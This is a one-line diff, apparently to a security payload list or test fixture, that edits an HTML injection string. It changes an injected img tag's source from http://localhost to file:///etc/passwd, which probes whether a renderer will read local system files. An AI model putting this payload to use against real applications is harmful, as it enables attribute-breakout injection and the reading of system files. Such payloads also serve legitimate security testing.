@@ -1,1 +1,1 @@
-"><img src="http://localhost">
+"><img src="file:///etc/passwd">
